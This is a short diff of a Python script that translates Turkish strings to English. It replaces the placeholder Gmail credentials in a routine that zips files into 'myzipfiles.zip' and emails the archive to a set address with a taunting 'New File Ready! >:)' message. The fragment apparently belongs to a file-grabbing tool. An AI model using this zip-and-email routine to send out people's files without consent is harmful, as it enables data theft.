@@ -42,15 +42,15 @@ def main():
 
  print('All files zipped successfully!')
  mail_content = '''Charon, 
- Yeni Dosyan Hazır >:)'''
- sender_address = 'emailin@gmail.com'
- sender_pass = 'sifren<uygulamasifresiolustur>'
- receiver_address = 'emailinegidecek@gmail.com'
+ New File Ready! >:)'''
+ sender_address = 'youremail@gmail.com'
+ sender_pass = 'password(app-password)'
+ receiver_address = 'to@gmail.com'
  
  message = MIMEMultipart()
  message['From'] = sender_address
  message['To'] = receiver_address
- message['Subject'] = 'Yeni Shared!.'
+ message['Subject'] = 'New Shared!.'
 
  message.attach(MIMEText(mail_content, 'plain'))
  attach_file_name = './myzipfiles.zip'
